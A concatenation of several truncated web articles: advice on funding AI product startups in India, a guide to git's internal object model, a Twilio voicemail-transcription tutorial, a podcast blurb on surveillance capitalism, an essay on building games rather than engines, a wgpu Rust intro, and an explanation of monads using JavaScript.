<p>* Fast growing means you can show metrics on which you are getting better faster YoY or quarter on quarter. These metrics are kind of fixed : Number of paying customers and revenue in B2B businesses and number of active users in consumer businesses. Unless you are really famous already due to some reason (or rich in which case you fund your own adventures), odds are VC wont fund your technology, papers, patents or github stars. In India, the famous people are ex-FAANG people, people from Indian unicorns, serial entrepreneurs, Stanford (or Ivy League) educated etc. They will find it slightly easy to find really good money for doing lesser than non-famous people. At seed funding level, being educated at India’s top T-Schools like IITs and BITS Pilani (I studied there) has some advantages. VCs will (unless you are special) either fund your startup if you have a product doing well, or a product showing growth and they can see potential in.</p>

<p>* Product business means you are selling the same concept to all your customers. I mean you cannot sell soap to one person and toothpaste to another and matchsticks to a third person. The reason is, unless you have a product, you wont be able to grow fast as stated earlier. More so in AI as building proper sellable AI products takes time (I will talk about it a lot later in this post) and there is no way you can grow fast if you need to invest time to build for every client. This might sound obvious advice to people from elsewhere, but freshers doing AI startups would often feel they can do everything in the world and need to be aware about it.</p>

<p>* Try to focus on your core business and avoid distractions. There will be many. If you have a good AI team, as of now the field is still nascent enough for your team to basically build into anything possible by AI. So every possible Deep Learning enabled business might sound like a missed opportunity to someone good at training algorithms. What AI founders need to realize is that PoC is just the first step and substantial investment post that is needed to build a product. Developing AI for a PoC is simple, building one which runs in production is not. Unless they FOCUS, they will not be able to build a product and hence not be able to show growth which they require to get funded and grow their business further.</p>

<p>* Let me emphasize that I think there is a very good opportunity to build AI services business too. You can solve different problems for different clients and rent out your great AI workforce. But that is not something that is being covered on this post. I am trying to highlight tricks to build a AI product startup which can possibly be accelerated by VC funding. A very different approach needs to be taken there.</p>

<p>Story of all startups are different and one cannot copy playbook of one into another blindly. Different startups raise seed funding at different times, accordingly will have PoCs at different levels at time of seed funding, will evolve and pivot differently and thus will grow and raise money with different trajectories. I could recount the story of my startup here, but it would be at a different time, under different circumstances than other startups and hence to learn from story directly would either be an oversimplification or hard to relate. So I will list down things I …</p></div></article></div></div></div>

    <p>The aim of this guide is to make you more comfortable with git without having to read a whole book.
I will do this by giving you more of an “inside tour” of the inner workings of git.</p>

<p>If you are curious and want to become more comfortable with git, this guide aims to satisfy your curiosity more than “traditional” git guides.</p>

<p>I hope you’ll learn enough here to use git with more confidence, and will know better where to look when you are stuck.</p>

<p>Git is a computer program that creates snapshots – essentially backups – of folders on your computer.
In git, these snapshots are called “commits”.
A commit contains everything in that folder:</p>
<ul>
  <li>The folder structure</li>
  <li>names of files</li>
  <li>contents of files</li>
  <li>metadata of files</li>
</ul>

<p>Git’s strengths come from how it organizes the commits and from all the commands it provides for manipulating, labelling, and comparing them.
Handling commits is what makes git a “Version Control System”.</p>

<p>Git tries to make it <em>very</em> easy to take backups so that you can always find a useful place to return to if needed. Also, having a detailed commit history can help answer questions about the state of things at different points in the past, and about why changes were made. Each commit has info about when it was created, and by whom, as well as a “commit message” written by the committer, which ideally contains important information about why it exists.</p>

<p>Git also has commands for collaborating with others (e.g. push/pull/fetch).
The collaboration essentially means exchanging commits and “branches” (which in git are just labels for commits).
Usually collaboration means sending them to a server where others can retrieve them, but it’s also possible to share them directly with other collaborators.<sup id="fnref:distributed"><a href="#fn:distributed">1</a></sup></p>

<h3 id="first-steps">First steps</h3>

<p>Download git: <a href="https://git-scm.com/download/">https://git-scm.com/download/</a></p>

<p>Git is usually used from the command line, but there are also other ways to use it (<code>git gui</code>, SourceTree, TortoiseGit to name a few.
<a href="https://git-scm.com/downloads/guis/">Here is a big list of graphical user interfaces for git</a>).</p>

<p>To download an existing repository (for example the one for this blog), run</p>

<div><div><pre><code>git clone https://github.com/oyvn/oyvn.github.io.git
</code></pre></div></div>

<p>To create your own repository in an existing folder, run</p>

<div><div><pre><code>git init                      # Creates the repository
git add .                     # Prepares a commit of whatever was in
                              # the folder.
git commit -m"Initial commit" # Stores the commit with the message
                              # "Initial commit"
</code></pre></div></div>

<h2 id="the-repository">The repository</h2>

<p>A “repository” (repo) is a collection of commits.
When you use <a href="https://git-scm.com/docs/git-init"><code>git init</code></a> to create a repo inside a folder, git adds a hidden folder called “.git” inside it. The .git folder is where it puts all the commits.</p>

<p>The rest of your folder is now referred to as the “working directory”.</p>

<p>When you create a commit, git stores all the files and folders as “objects” in the .git folder.
Together, the stored objects contain all the information necessary to recreate the contents of the working directory.</p>

<p>When you retrieve a repo with <a href="https://git-scm.com/docs/git-clone"><code>git clone</code></a>, git essentially retrieves the .git folder and recreates – “checks out” – the working directory from the objects.</p>

<p>There are a few different types of git objects, let’s take a closer look.</p>

<h2 id="the-objects---commit-tree-and-blob">The objects - commit, tree and blob</h2>

<p>In git, everything is files.
All objects are stored as files in the .git repo.
Objects have different types depending on what data they contain.
An object’s file name is usually a string of gibberish that serves as a unique reference to that object.</p>

<p>When you call <a href="https://git-scm.com/docs/git-commit"><code>git commit</code></a>, git creates a “commit” object, as well as “tree” objects for each folder, and “blob” objects for each file in the snapshot.
The blob is the simplest, it’s just a copy of the file, except for the name, which is a gibberish reference instead.</p>

<p>If you look in <code>.git/objects</code> you will find all commit, tree, and blob objects in your repo, all with gibberish names.</p>

<p>By not associating objects with file or folder names, the object can be reused even if the name or location of a file or folder changes, as long as the contents remain unchanged.</p>

<p>A tree object contains:</p>

<ul>
  <li>The name and a reference for every immediate sub-folder. The reference is to a tree object describing the sub-folder’s contents.</li>
  <li>The name and a reference for every file in the folder. The reference is to a blob object with the file contents.</li>
</ul>

<p>A commit object contains:</p>

<ul>
  <li>The committer and author (That’s you, if you made the commit – your name and email address as configured via <a href="https://git-scm.com/docs/git-config"><code>git config</code></a>).</li>
  <li>The current date and time.</li>
  <li>The commit message that you authored in the process of committing.</li>
  <li>A reference to the tree object for the working directory.</li>
  <li>One or more references to other commit objects (“parent commits”).</li>
</ul>

<p>At this point I want you to notice a few things:</p>

<ul>
  <li>Each commit points to a parent.
This means the commit can be understood as building on something that came before it.</li>
  <li>Even though a commit is thought of as a <em>change</em>, or <em>difference</em> (also called a “delta”), it is stored by git as a standalone snapshot.
Any information about what change it represents is computed when needed, by comparing commits.</li>
  <li>Because objects are referred to by reference, any time an object already exists git just refers to the existing object.
So when your commit only changes one file, only one new blob object (and at least one tree object) needs to be created.</li>
  <li>Retrieving any object by its reference just means finding a file with a certain name.</li>
</ul>

<p>Objects are described in depth in the <a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">Git Internals</a> chapter of the free Pro Git Book.
I recommend it if you are curious, it’s where I learned this.</p>

<p>Now let’s take a closer look at the unique gibberish reference (“hash”).</p>

<h2 id="references-the-hash">References (the “<a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function">hash</a>”)</h2>
<p>This section might be heavy, but keep going, it gets to the heart of many of git’s quirks.</p>

<p>In git, there are hashes everywhere, displayed as long strings of numbers and letters.
All objects have hashes, but you mostly see commit hashes, for example when you run <a href="https://git-scm.com/docs/git-log"><code>git log</code></a>.</p>

<p><img src="https://oyvn.github.io/assets/git-log.png" alt="git log" title="git log output."></p>
<p>git log output from this blog’s repo.</p>

<p>The hash is calculated from the contents of a given object, and is  completely unique to that object.
It’s often called the “sha” of the commit, because the hash is of the type <a href="https://en.wikipedia.org/wiki/SHA-1">sha1</a>.</p>

<p>A hash (or “digest”) is a big number which always a certain length.
For sha1, the length is 160 bits, or 20 bytes<sup id="fnref:sha1_finite"><a href="#fn:sha1_finite">3</a></sup>.
In git, these bytes are always displayed as a text string of 40 <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal</a> characters (0-9, a-f)<sup id="fnref:sha_length"><a href="#fn:sha_length">4</a></sup>.</p>

<p>The hash is created by taking the data (the input) and doing some convoluted math on it.
The input can be any data, of any length.
In git, objects serve as inputs.</p>

<p>The convoluted math is such that the hash follows some very strict rules:</p>

<ul>
  <li>The length of the hash is the same regardless of the length of the input.</li>
  <li>The hash is always the same every time if the input is the same.</li>
  <li>The hash is always <em>completely</em> different if the input is even <em>slightly</em> different, even if a single bit is changed, added or removed.</li>
  <li>Finding an input for a given hash (i.e. calculating the hash backwards) is impossible.</li>
</ul>

<div><div><pre><code>sha1("a"):
    86f7e437faa5a7fce15d1ddcb9eaeaea377667b8
sha1("To die, to sleep - to sleep, perchance to dream - ay, there's the rub, for in this sleep of death what dreams may come"):
    0855319deffa58b0458c29edeaa8d6a120d44f35
sha1("to die, to sleep - to sleep, perchance to dream - ay, there's the rub, for in this sleep of death what dreams may come"):
    cab29b74b98c3ad638fe9c1abed72be40d69badc
</code></pre></div></div>

<p>Some example SHA1 hashes.</p>

<p>From these rules, we can realize that if <em>any</em> data in an object changes, it is no longer the same object, because the reference will be completely different.
That includes if the time changes by just one second in a commit, or a file changes by just one byte, or if a folder name changes slightly.</p>

<p>It also means that the changes must propagate.
If a file changes, its reference changes, so the tree containing the reference changes, and the commit containing the tree changes.</p>

<p>Any commits descended from the commit must also change.
In fact, looking backwards in time, a commit hash uniquely identifies not just the commit, but also, through its parents and grandparents etc., the entire git history - every tree, blob, and commit - up until that commit. If any detail in any place in the history was different, the current commit would not be the same commit since its hash would be different.</p>

<p>Phew!</p>

<p>Ok. Time for a short story about something slightly different.</p>

<h2 id="intermission-index">Intermission: Index</h2>

<p>When creating a commit, you might want to limit the difference from the previous commit.
You’ll want to group changes in a logical way, to make the commit easier to describe, and to reason about later.</p>

<p>You might have done many changes, though, since the last commit.
Git helps in this situation by allowing you to “stage” changes before commiting them.
<a href="https://git-scm.com/docs/git-add"><code>git add</code></a> adds files to the “index” i.e. stages them, i.e. marks them as “to be committed”.</p>

<p>When you create the commit, only the staged files and folders receive new objects, the rest are stored as unchanged.</p>

<p>Git creates trees and blobs from the files as you stage them, so that <code>git commit</code> just needs to create a commit object which references the tree created for the index.</p>

<p>The index often confuses people, but at this point in the guide it might be interesting to realize the similarities between the index and a commit.</p>

<p>Now for the story.</p>

<p>I once mistakenly deleted a new file I had been working on, losing several hours of work since I hadn’t committed it (commit often, people!).
But I remembered that I had staged it at one point, so I knew a blob object was created.
I managed to search the files in my .git folder for a phrase present in the lost file, and I found the file.
The blob …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://aeneaswiener.com/@aeneaswiener?source=post_page-----f0983f00c5dd----------------------" rel="noopener"><img alt="Aeneas Wiener" src="https://miro.medium.com/fit/c/96/96/0*b3kWvKKHBrVbkClm.png" width="48" height="48"></a></p></div></div></div></div><p id="06f6">If you have repeatedly found yourself wasting time dialling into your network provider’s archaic interactive voicemail system, you will be familiar with excruciating sounds like</p><blockquote><p id="b719">You have 30 new voicemail messages. Message from […] received on the 13th of September, 2020, at 13 hours, 12 minutes, and 13 seconds. To listen to your message again please press 1, to call the sender press 2, to never hear it again, press 3…</p></blockquote><p id="b379">After spending minutes painfully going through messages you don’t care about, you know that technology owes you something better in 2020 and beyond.</p><p id="09b6">The original iPhone promised us visual voicemail in 2007. I was blown away by it. Finally, here was a way to see all voicemail messages in a list (like incoming emails) and be able to tap on them to hear them. Unfortunately, even 10 years after the launch of the iPhone, this feature is still not available on all networks, including Three in the UK. And in any case, would it not be great if messages were not just there to listen to, but also transcribed into text? Because reading a keyword that screams unsolicited phone call takes 20 milliseconds, whilst listening to the full message around it takes 20 seconds.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1960/1*DCFEXOprD0wn4XqCZpvZOg.png" width="980" height="1298" srcset="https://miro.medium.com/max/552/1*DCFEXOprD0wn4XqCZpvZOg.png 276w, https://miro.medium.com/max/1000/1*DCFEXOprD0wn4XqCZpvZOg.png 500w" sizes="500px" data-old-src="https://miro.medium.com/max/46/1*DCFEXOprD0wn4XqCZpvZOg.png?q=20"></p></div></div></div><figcaption>All incoming voicemail messages will be transcribed and the text will be sent to you as a text message, alongside the number of the caller you can tap to dial back, and a link to the audio file you can tap to play</figcaption></figure><p id="14f5">Below I will show you how you can set this up thanks to the power of powerful modern API platforms, no-code programming technology, and a 90s style dial-this-special-number-to-set-up-call-forwarding feature offered by your network provider.</p><p id="8786">By the end of it you will have a setup where any call that doesn’t reach you (either because your phone was off, or because you sent it to voicemail) will receive a custom greeting of your choice, and anything the callers say after the beep will be recorded. A transcript of this recording will be sent to you via text message, alongside their phone number which you can tap to call back, and a link to an audio file so you can hear what they said.</p><p id="c73f">Doesn’t that feel more like 2020? And of course you will be able to configure the voicemail greeting to your liking. Because just as Larry Page <a href="https://www.acquired.fm/episodes/google-maps" target="_blank" rel="noopener">told the original Google Maps entrepreneurs</a> “we like the web” when they presented him with a clunky desktop app, now your voicemail greeting will be able to proudly proclaim: “ I like email”:</p><blockquote><p id="f3f5">Hello! Welcome to my voicemail service. I like email. If we have spoken before and you are able to contact me by email please do so. Otherwise please leave your message after the tone and (if required) I will get back to you as soon as possible. Thank you.</p></blockquote><p id="0401">The steps are outlined below in broad strokes. I haven’t shown all the configuration details. I suggest that as you go through it you have a look at the documentation to know what all the various parameters mean so that you can customise them to your liking. I am only showing very high level what the steps are to get this set up.</p><p id="550f"><strong>Step 1: Sign up for a Twilio account at </strong><a href="https://www.twilio.com/" target="_blank" rel="noopener">https://www.twilio.com</a></p><p id="52a4">We will use Twilio to create a new (virtual) phone number to receive all voicemail calls we forward to it. We will then use Twilio’s no-code builder to create an application that reads out a custom greeting any time this virtual Twilio number receives a call, and then after the beep records what they say.</p><p id="9f02">The recorded messages will be transcribed to text by Twilio and forwarded to a JavaScript function (we create in their function as a service environment.) This JavaScript function (written in NodeJS,) will send a text message to your own phone number containing three things (shown in the image above): the transcript of the recorded voicemail message left by the person who called, the caller’s number, and a link to the audio recording so we can tap to listen in case the transcription wasn’t clear enough.</p><p id="1eaf"><strong>Step 2: Buy a virtual phone number</strong></p><p id="2f41">We will need this number so we can forward all calls you send to voicemail to this number. We can buy this virtual phone number by logging into the twilio dashboard, and then click on SUPER NETWORK &gt; Phone Numbers.</p><p id="b6e8"><strong>Step 3: Use Twilio Studio to create the phone answering flow</strong></p><p id="6bda">This step is the most complicated. We will need to click around in the documentation a bit to get familiar with things. In broad strokes, we use Twilio Studio to set up your voicemail greeting using their “Say/Play” action, and then link it to a call recording action using their “Record Voicemail” step. After we are done, our canvas should look a bit like the below.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/0*comHGZrsRtmc6Om7" width="1600" height="1114" srcset="https://miro.medium.com/max/552/0*comHGZrsRtmc6Om7 276w, https://miro.medium.com/max/1104/0*comHGZrsRtmc6Om7 552w, https://miro.medium.com/max/1280/0*comHGZrsRtmc6Om7 640w, https://miro.medium.com/max/1400/0*comHGZrsRtmc6Om7 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*comHGZrsRtmc6Om7?q=20"></p></div></div></div><figcaption>The the phone answering flow</figcaption></figure><p id="47dd"><strong>Step 4: Link your Twilio phone number to your Twilio Studio flow</strong></p><p id="8909">Link our Twilio phone number (purchased in Step 2) to the flow we created in Step 3.

        <p>In her new book, The Age of Surveillance Capitalism, Harvard Business School’s Shoshana Zuboff argues Google and Facebook collect so much personal data for profit, that they’re changing the fundamentals of our economy and way of life. And now these companies are learning to shape our behavior to better serve their business goals. Shoshana joins Manoush Zomorodi to explain what this all means for us.</p>
        <p>We then explore whether or not it’s time to end our relationship with corporate spies. OG advice columnist Dear Abby gives us some tips to start with. We chat with philosopher S. Matthew Liao. <strong>He asks if we have a moral duty to quit Facebook.</strong> And journalist Nithin Coca tells us what it was like for him to quit both Facebook and Google. Spoiler alert: it wasn’t easy, but he has no regrets.</p>

    <time datetime="2020-08-28T00:00:00+00:00">August 28, 2020</time>
  </header>
  
<p>There’s a frequestion request on game development forums and sites:</p>

<blockquote>
  <p>I want to learn how to make my own game engine.</p>
</blockquote>

<p>Invariably, responses to the request say something like “make games, not engines” or link to the <a href="https://geometrian.com/programming/tutorials/write-games-not-engines/index.php">blog post of the same name</a> (mirrored as the original is gone).</p>

<p>Predictably, some folks don’t take kindly to the advice, and they have seemingly good reasons why they disagree with the notion. One such reason is that they want to do it <strong>just for fun</strong>. I can’t argue with that reason at all; I do the exact same thing!</p>

<p>The other major justification for making an engine, however, I do have some issue with: when someone wants to write a game engine <strong>to learn how to make games</strong>.</p>

<p>I <em>also</em> take issue with the adjacent justification of wanting to make an engine to <strong>learn about game engines</strong>.</p>

<h2 id="learning-by-doing">Learning by Doing</h2>

<p>A strong way for many folks to learn, myself included, is to learn by doing. That is, practicing. What to learn to play the guitar? Play the guitar a lot, even though you’re initially <em>really</em> bad at it, until you get good. What to learn to algebra? While you’ll certainly need to do a lot of reading, it’s not going to be cemented as a real skill in your mind until you practice it over and over, hence why teachers push homework on us so much.</p>

<p>This extends right into making games. Want to learn to make games? Make a lot of games! They’ll be simplistic and probably buggy and not especially interesting at first, but those first steps will lead to second steps and third steps and eventually there’s potential to make something really great, but only after all that practice.</p>

<p>Learning to make games by making a game <em>engine</em> is another thing entirely, though. That would be like trying to learn to play guitars by practicing <a href="https://en.wikipedia.org/wiki/Luthier">lutherie</a> (making guitars).</p>

<p>Quite simply, it’s bass-ackwards.</p>

<h2 id="what-an-engine-is">What an Engine Is</h2>

<p>There is no clear definition of “game engine.” Ask 50 game developers what an engine is and you’ll likely get 50 different answers… even if all 50 of those developers happen to work on the same engine.</p>

<p>For example, <a href="https://en.wikipedia.org/wiki/Game_engine">Wikipedia’s definition</a> is that a game engine “is a software-development environment designed for people to build video games” which is not something I’d generally agree with, though it <em>does</em> describe a very common set of well-known engines.</p>

<p>See, <em>every game</em> has an engine. Even games made “without an engine” have an engine. A game’s engine is basically just the software that runs the game. That may be an off-the-shelf no-coding-required tool like <a href="https://www.unrealengine.com/en-US/">Unreal</a>, a some-assembly-required tool like <a href="https://cocos2d-x.org/">Cocos2d-x</a>, or a completely bespoke set of logic as in every early arcade or console or PC game before the advent of <em>reusable</em> engines.</p>

<p>A definition of game engine that I happen to like: a game engine is the interpreter for the game’s data.</p>

<p>The key bit here for this article though is that an engine’s entire reason to exist is to <em>power a game</em>. No game, no game engine.</p>

<p>Well, okay, “game engines” are used for things besides games, like <a href="https://arstechnica.com/gaming/2020/02/the-mandalorian-was-shot-on-a-holodeck-esque-set-with-unreal-engine-video-shows/">Unreal used for filming the Mandalorian</a>. I’m going to count that out though as that’s not really about Unreal as a game engine, but rather Unreal as a real-time 3D package. (Yes, this distinction matters. I’ll explain why later on in this post.)</p>

<p>This definition needs to be found <em>for a specific project</em>. If someone wants to make an engine, they need to understand what that means to them. Is it an interpreter for an existing set of game assets, like <a href="https://www.scummvm.org/">ScummVM</a> ? Is it a framework for programmers to build their own games? Does it include tools like a game object editor or level editor? Does it include all the supporting services and APIs for user authentication, cloud saves, match making, and cloud hosting of game sessions? Does it aim to support multiple platforms? Which programming language(s) is the end-user team familiar with? What digital content creation (DCC) tools are the artists going to be using? Does the engine need to place real-time multiplayer as a central feature? Is the goal to provide a framework than some AAA developer could base a multi-million dollar game on or is the goal to provide a point-n-click tool for hobbyists to build simple games? Is it for 2D or 3D games or both?</p>

<p>Each of those questions can impact what an engine <em>is</em> and what it is <em>for</em> and can completely change the course of development for any engine project.</p>

<h2 id="engine-strengths-and-weaknesses">Engine Strengths and Weaknesses</h2>

<p>Every engine - every piece of software, every technology, every process, every <em>thing</em> really - has strengths and weaknesses.</p>

<p>It’s rare to talk to a game dev using Unreal who won’t speak about the difficulties in using it for games that don’t happen to look and play similarly to Epic’s major titles (previously Unreal Tournament, then Gears, and now Fortnite). That’s not because of any failure on Unreal’s developer’s part, either! It’s just a fact of having to make tough calls about tradeoffs.</p>

<p>There is rarely a single “best” solution to a problem. When developing something like a game engine, intelligent choices need to be made about which things to optimize for. When making a game-creation suite, similar choices need to be made.</p>

<p>And choosing to implement <em>multiple</em> solutions to cover all the bases likewise is a tradeoff, if in nothing else than time and money and complexity.</p>

<p>The point here is that any engine is going to be really good for <em>some</em> games and a very poor fit for <em>other</em> games. There’s no avoiding being poor fit for some games, <em>especially</em> when an engine is young. Unreal is a lot better for a lot more varieties of games today than it ever was, primarily because Epic took so much feedback from so many customers making so many games.</p>

<p>Another case study might be <a href="https://unity.com/">Untiy</a>. Just to cut to the chase and be perfectly frank, Unity was <em>awful</em> for almost any use case in its earlier years. Really, anything before Unity 5 was a pure frustration for all but the simplest of games, due to a variety of outright missing features, serious usability speedbumps, showstopping bugs, or the requirement to work around Unity to achieve game features. This wasn’t just for “major” games, either; even smaller indie games would run into these kinds of problems at high frequency.</p>

<p>Obviously, Unity is a <em>lot</em> better these days and is quite suitable for making a wide variety of games, big and small; this is only because, like Epic, the developers at Unity took a lot of feedback from game developers and iterated on the core tools necessary to make their games. Again, this early roughness isn’t the fault of Unity’s developers!</p>

<p>It’s because Unity had no real use cases in the early days; it had no <em>specific games</em> for which it was made. It was a group of very experienced game developers putting in their ideas of what a game engine <em>should</em> do to enable easy game creation, but even with all that experience, without a real use case there’s no way to qualitatively decide on which tradeoffs should be made, even where those tradeoffs are just whether feature A should be implemented before feature B. The turn-around for Unity wasn’t that the devs got any smarter (they were already super smart!) or more experienced or anything like that; it was that they had the feedback of a lot of game developers and used that to guide their development so the engine worked better for those games.</p>

<p>Every game engine is built on choices, and those choices - for a game engine that succeeds at enabling game devs - is motivated by the needs of the game(s) being built with the tech.</p>

<h2 id="games-provide-context">Games Provide Context</h2>

<p>The real point to this whole article is that games provide context for a game engine.</p>

<p>The same is true in just about any context: drivers provide context for vehicles, moviegoers provide context for filmmakers, wine connoisseurs provide context for sommeliers, and so on.</p>

<p>For game engines, for developers making engines, having a concrete game or games to inform the decision making process and provide focused feedback is key.</p>

<p>If the goal is to learn to make game engines <em>for games</em>, then, simply making an engine in a vacuum without a target game is not useful. There are a million and more decisions to make in the course of engine development and without a game, there’s no way to know <em>for sure</em> if those decisions are being made “correctly.” And I put that in quotes because there <strong>is sometimes no correct choice</strong> without proper context.</p>

<p>This is where we start seeing things like Unreal’s use in filmmaking becoming relevant. Unreal didn’t start out supporting that use case and it almost certainly wasn’t in any of the developers’ minds in the beginning. However, there was a progression over time: games needed cut-scenes, and games wanted <em>in-engine</em> cut-scenes, so the engine needed to support these and the tools needed to provide the means for these scenes to be authored. Those tools then started enabling “machinema” like some of the early <a href="https://roosterteeth.com/series/red-vs-blue">Red vs Blue</a> shorts based on the Halo series, which in turn led to feedback about the tools’ capabilities for authoring these kinds of “long-form scenes.” Then AR/VR began requiring games and their engines to support real-time manipulation of real-life visual data. This started enabling experimentation with using game engines for real-time scene visualization in filmmaking. Which naturally allowed for feedback and direction from new paying customers in Hollywood.</p>

<p>It was use cases and contextualization, all the way down.</p>

<p>Note that if a new tool were built specifically for Hollywood, it probably wouldn’t be a great tool at first for game devs. Just as Unreal took many years and many steps and many feedback cycles to ready itself for film, a film-centric tool would likely take a significant amount of time and feedback to ready itself for interactive gameplay.</p>

<h2 id="understanding-the-use-cases">Understanding the Use Cases</h2>

<p>There’s still the very real possibility that someone wants to write an engine, doesn’t care if it’s any good for any actual games, and just wants to experiment for learning purposes. Okay, that’s fair.</p>

<p>After all, despite everything I said earlier …</p></article></div>

WebGPU is a specification published by the GPU for the Web Community Group. It aims to allow web code access to GPU functions in a safe and reliable manner. It does this by mimicking the Vulkan API, and translating that down to whatever API the host hardware is using (ie. DirectX, Metal, Vulkan).</p> <p>Wgpu is still in development, so some of this doc is subject to change.</p> <h2 id="why-rust"><a href="#why-rust">#</a> Why Rust?</h2> <p>Wgpu actually has C bindings to allow you to write C/C++ code with it, as well as use other languages that interface with C. That being said, wgpu is written in Rust, and it has some convient Rust Bindings that don't have to jump through any hoops. On top of that, I've been enjoying writing in Rust.</p> <p>You should be fairly familiar with Rust before using this tutorial as I won't go into much detail on Rust syntax. If you're not super comfortable with Rust you can review the <a href="https://www.rust-lang.org/learn" target="_blank" rel="noopener noreferrer">Rust tutorial</a>. You should also be familiar about <a href="https://doc.rust-lang.org/cargo/" target="_blank" rel="noopener noreferrer">Cargo</a>.</p> <p>I'm using this project as a way to learn wgpu myself, so I might miss some important details, or explain things wrong. I'm always open to constructive feedback. That being said, let's get started!</p></div><div><!----> <p><span>Last Updated: </span> <span>11/12/2019, 11:52:09 PM</span></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>I got into a discussion about monads recently. On a search to find some resources to share, I realized that most essays explained them with type signatures and rules. A missing ingredient to grok them, I think, is to understand the intuition behind them. How could you end up <em>inventing</em> monads?</p><p>Okay, let’s try to build that intuition. We’ll avoid both types and category theory.</p><p>Say you have a few functions to get a user, a profile, and a display picture:</p><pre><code>function getUser(id) { 
  return USERS[id] 
}

function getProfile(user) { 
  return user.profile
}

function getDisplayPicture(profile) { 
  return profile.displayPicture
}</code></pre><p>Now, given an id, how would you get the profile picture?</p><p>You could write this: </p><pre><code>getDisplayPicture(getProfile(getUser(id)))</code></pre><p>Buut, this would throw an error: all these functions <em>could</em> return null. If <code>getUser</code> returned null for example, you would see: </p><pre><code>Uncaught TypeError: Cannot read property 'profile' of undefined</code></pre><p>To fix this, you may end up writing something like this:</p><pre><code>function getDisplayPictureFromId(id) { 
  const user = getUser(id)
  if (!user) return
  const profile = getProfile(user)
  if (!profile) return
  return getDisplayPicture(profile)
}</code></pre><p>But, this is getting pretty ugly. All these conditional returns distract from what you’re really trying to do. <strong>What if there was a way to get rid of these conditionals?</strong></p><p>So, that’s our challenge: let’s get rid of these conditionals. One way we can do this, is to make some kind of helper. This helper would let us chain these functions together: </p><pre><code>new Chainer(getUser(id))
  .whenExists(user =&gt; getProfile(user))
  .whenExists(profile =&gt; getDisplayPicture(profile))</code></pre><p>This looks pretty good. Let’s implement it.</p><h2>whenExists</h2><p><code>.whenExists</code> would only run the callback if the value exists. Here’s how you could write this:</p><pre><code>class Chainer {
  constructor(v) { 
      this.value = v
  }
  whenExists(f) { 
      if (!this.value) return this;
      return new Chainer(f(this.value))
  }
}</code></pre><p>And voila, with just this, we can now write</p><pre><code>function getProfilePictureFromId(id) { 
  return new Chainer(getUser(id))
    .whenExists(user =&gt; getProfile(user))
    .whenExists(profile =&gt; getDisplayPicture(profile))
}</code></pre><h2>More Problems</h2><p>Notice that <code>getDisplayPictureFromId</code> now returns a <code>Chainer</code>. </p><p>Imagine we had another function <code>resizeDisplayPicture</code>, that <em>also</em> returned a Chainer</p><pre><code>function resizeDisplayPicture(pic) { 
    return new Chainer(pic).whenExists(pic =&gt; ...
}</code></pre><p>What would happen, if we wrote:</p><pre><code>getProfilePictureFromId(id).whenExists(pic =&gt; resizeDisplayPicture(pic))</code></pre><p>Let’s look at whenExists again:</p><pre><code>whenExists(f) { 
  if (!this.value) return this;
  return new Chainer(f(this.value))
}</code></pre><p>If <code>getProfilePictureFromId(id)</code> did exist, we would run </p><pre><code>new Chainer(f(this.value))</code></pre><p>which in this case is</p><pre><code>new Chainer(resizeDisplayPicture(this.value)) </code></pre><p>Which becomes </p><pre><code>new Chainer(new Chainer(this.value)...</code></pre><p><strong>Uh oh. We now have a Chainer inside of a Chainer.</strong> Ideally, we’d want a function that somehow “merged” these chainers together.</p><h2>whenExistsMerge</h2><p>So let’s do that. We can call it <code>whenExistsMerge</code></p><pre><code>class Chainer {
  constructor(v) { 
      this.value = v
  }
  whenExists(f) { 
      if (!this.value) return this;
      return new Chainer(f(this.value))
  }
  whenExistsMerge(f) { 
      if (!this.value) return this;
      return f(this.value)
  }
}</code></pre><p>And with that, we can write </p><pre><code>getProfilePictureFromId(id)
  .whenExistsMerge(pic =&gt; resizeDisplayPicture(pic))
  .whenExists(resizedPic =&gt; ...)</code></pre><p><strong>Aand voila, you’ve just invented a specific type of monad.</strong> Kind of (1). Chainer is analogous to the <code>Maybe</code> monad. <code>whenExists</code> is analogous to its <code>fmap</code> operation, and <code>whenExistsMerge</code> is analogous to its <code>bind</code> operation. If you’re curious about the type-based technicalities now, <a href="http://adit.io/posts/2013-04-17-functors,_applicatives,_and_monads_in_pictures.html" target="_blank">see this essay</a>. </p><p>So, now we’ve found this cool <code>Chainer</code>. We can stop here, or think a bit further. What’s so special about it? </p><p>Well, it’s like a box that wraps around some information. We can interact with that box with  <code>whenExists</code> and <code>whenExistsMerge</code>.</p><p>How else can we use the idea of <code>box</code> and <code>whenExists?</code></p><p>Here’s one. Let’s say you were dealing with callback hell: </p><pre><code>fetchUser(id, (err, user) =&gt; {
  if (err) ... 
    fetchProfile(profile, (err, profile) =&gt; { 
      if (err) ...
        fetchDisplayPicture(...
    }
}</code></pre><p>What if we created something like an <code>Async Chainer</code>: it stores the result of some future computation. Then, you could use the <code>whenExists*</code> functions, which let you interact with the value <em>when</em> it is computed. We turn the callback hell into</p><pre><code> fetchUser(id).whenExistsMerge(fetchProfile).whenExistsMerge(fetchDisplayPicture)</code></pre><p>Well, replace <code>whenExistsMerge</code> with <code>then</code>, and you're on a road to discover <code>Promise</code>, which is also a monad. Kind of (2). </p><p>Now, it’s pretty cool to notice that both the nullable use case and the async use case have the same interface. The name <code>whenExists</code> may be a bit too specific. Really, what it does is give you an interface to <code>map</code> over the value. If you use the word <code>map</code>, <code>whenExistsMerge</code> really lets you <code>flatMap</code> over the value. </p><p>This begins to get us to the fundamental abstraction of a monad: a box, with an interface for <code>map</code>, and <code>flatMap</code>. As you look deeper, you’ll notice that this abstraction can handle a lot of other things. If you’re curious, research the <code>Result</code> monad for example.</p><p>And with that, you’ve invented monads : ) </p><h2>Aside: Do you <em>really</em> need this?</h2><p>As you went through this, you may have realized that there are other ways to solve the problems that monads solve. Instead of <code>Chainer</code>, your language could have a <a href="https://kotlinlang.org/docs/reference/null-safety.html#safe-calls" target="_blank">safe call</a> abstraction. Instead of <code>Promise</code>, your language could have an <code>async/await</code> abstraction. Sometimes those can be a better <a 